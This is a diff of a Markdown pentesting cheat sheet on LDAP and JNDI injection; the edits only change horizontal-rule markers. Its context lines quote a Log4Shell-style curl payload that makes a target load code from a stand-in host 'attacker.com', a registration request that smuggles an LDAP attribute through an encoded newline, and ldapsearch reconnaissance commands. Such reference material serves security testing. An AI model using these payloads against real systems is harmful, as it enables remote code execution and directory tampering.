@@ -19,7 +19,7 @@ linked:
 ---
 # LDAP Injection - JNDI y Entry Injection
 
-***
+---
 
 ## JNDI Lookup Injection (Log4Shell-style)
 
@@ -55,7 +55,7 @@ curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/<base6
      https://target/
 ```
 
-___
+---
 
 ## LDAP Entry Poisoning
 
@@ -69,7 +69,7 @@ ___
 | `curl --data-urlencode "displayName=Admin <admin@target.com>%0aobjectClass: organizationalPerson" https://target/register` | Phishing-context display name | UI confusion. |
 ^ldap-jndi-entry
 
-___
+---
 
 ## LDAP Referral Abuse
 
@@ -83,7 +83,7 @@ ___
 | `ldapsearch -H ldap://target -x -O "ManageDsaIT" -b "dc=target,dc=com"` | Disable referral chasing | Defense check. |
 ^ldap-jndi-referral
 
-___
+---
 
 ## Schema-Based Gadgets
 
@@ -97,4 +97,4 @@ ___
 | `ldapsearch -H ldap://target -b "" -s base "(objectClass=*)" "+ *"` | Schema enumeration completo | Pre-attack recon. |
 ^ldap-jndi-schema
 
-***
+---
